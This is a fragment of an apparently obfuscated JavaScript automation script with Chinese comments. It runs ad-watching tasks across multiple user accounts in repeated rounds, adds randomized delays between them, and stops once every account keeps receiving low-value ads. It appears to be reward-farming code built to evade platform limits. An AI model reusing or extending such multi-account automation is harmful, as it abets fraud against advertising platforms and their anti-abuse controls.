  console.log('╚══════════════════════════════════════════════════════════════╝')
}

const startTask = async () => {
  //判断所有账号低价值连续超过failadnum次才结束程序
  let allExceededLimit = true
  let totalUsers = _omQc0mc.userCount

  // 检查是否所有账号都超过限制
  for (let salt in _omQc0mc.failadnumobj) {
    if (_omQc0mc.failadnumobj[salt] < _omQc0mc.failadnum) {
      allExceededLimit = false
      break
    }
  }

  // 如果没有账号记录或者账号数不匹配，则不算所有账号都超过限制
  if (Object.keys(_omQc0mc.failadnumobj).length < totalUsers) {
    allExceededLimit = false
  }

  if (allExceededLimit) {
    _omQc0mc.log(`所有账号连续低价值广告超过${_omQc0mc.failadnum}次，停止运行`)
    _omQc0mc.done()
    return
  }

  _omQc0mc.wheelNum++
  _omQc0mc.userIdx = 1
  if (_omQc0mc.sort == 1) {
    for (let user of _omQc0mc.userList) {
      await new userTask(user).run()
      const t = Math.floor(Math.random() * 20 + 30)
      await _omQc0mc.wait(t)
    }
  } else {
    await Promise.all(_omQc0mc.userList.map((user) => new userTask(user).run()))
  }

  if (_omQc0mc.wheelNum < _omQc0mc.count) {
    const t = Math.floor(Math.random() * _omQc0mc.time1 + _omQc0mc.time)
    _omQc0mc.log(`第${_omQc0mc.wheelNum}次任务完成 等待${t}秒后继续执行`)

    await _omQc0mc.wait(t * 1000)
    await startTask()
  } else {
    _omQc0mc.log('所有任务完成')
    _omQc0mc.done()
  }
}

!(async () => {
  await getNotice()
  _omQc0mc.checkEnv()
  // 并发执行所有任务：创建所有Promise并通过Promise.all并行执行
  await startTask()
})()
  .catch((err) => {
    return _omQc0mc.log(err)
  })
  .finally(() => {
    return _omQc0mc.done()
  })